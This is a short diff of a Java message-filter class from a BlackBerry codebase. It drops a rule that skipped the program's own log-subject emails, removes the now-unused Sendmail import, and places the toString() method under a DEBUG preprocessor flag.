@@ -22,9 +22,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
-import blackberry.utils.Sendmail;
 import blackberry.utils.WChar;
-
 
 /**
  * The Class Filter.
@@ -260,10 +258,6 @@ public class Filter {
         Check.asserts(from != null, "filterMessage: from!=null");
         //#endif
 
-        if (message.getSubject().startsWith(Sendmail.LOGSUBJECT)) {
-            return FILTERED_SENDMAIL;
-        }
-
         final Folder folder = message.getFolder();
 
         //#ifdef DEBUG
@@ -387,8 +381,10 @@ public class Filter {
         return hash;
     }
 
+    //#ifdef DEBUG
     public final String toString() {
         final StringBuffer sb = new StringBuffer();
+        
         switch (classtype) {
         case Filter.CLASS_EMAIL:
             sb.append("EMAIL ");
@@ -419,7 +415,8 @@ public class Filter {
         sb.append(" size: " + maxMessageSize);
         sb.append(" log: " + maxMessageSizeToLog);
         sb.append(" en: " + enabled);
-
+        
         return sb.toString();
     }
+    //#endif
 }
